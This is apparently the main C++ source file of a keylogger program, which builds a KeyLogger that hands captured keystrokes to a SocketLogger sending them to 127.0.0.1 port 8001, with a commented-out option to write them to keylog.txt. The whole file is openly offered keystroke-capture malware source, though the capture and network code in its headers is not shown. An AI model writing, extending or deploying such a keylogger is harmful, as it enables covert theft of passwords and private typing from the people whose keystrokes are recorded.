#include <iostream>
#include "KeyLogger.h"
#include "FileLogger.h"
#include "SocketLogger.h"

using namespace std;

int main()
{
	//Logger* logger = new FileLogger(L"keylog.txt");
	Logger* logger = new SocketLogger("127.0.0.1", 8001);
    KeyLogger* keyLogger = new KeyLogger(logger);
	
	try {
		keyLogger->StartLogging();
	}
	catch (exception) {
		cout << "Exception received";
	}

	delete logger;
	delete keyLogger;
}
